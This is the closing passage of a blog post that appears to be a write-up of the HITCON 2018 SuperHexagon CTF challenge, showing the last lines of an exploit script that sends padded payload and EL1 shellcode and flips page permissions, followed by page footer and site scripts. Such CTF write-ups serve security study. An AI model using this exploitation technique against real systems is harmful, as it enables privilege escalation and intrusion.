</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(EL1_shellcode)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># AP 01 -&gt; EL0 RW EL1 RW </span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/hitcon-2018-superhexagon/">HITCON 2018 SuperHexagon</a></li>
      <li><a href="https://msh1307.kr/tags/hypervisor-exploit/">Hypervisor Exploit</a></li>
      <li><a href="https://msh1307.kr/tags/kernel-exploit/">Kernel Exploit</a></li>
      <li><a href="https://msh1307.kr/tags/secure-monitor-exploit/">Secure Monitor Exploit</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
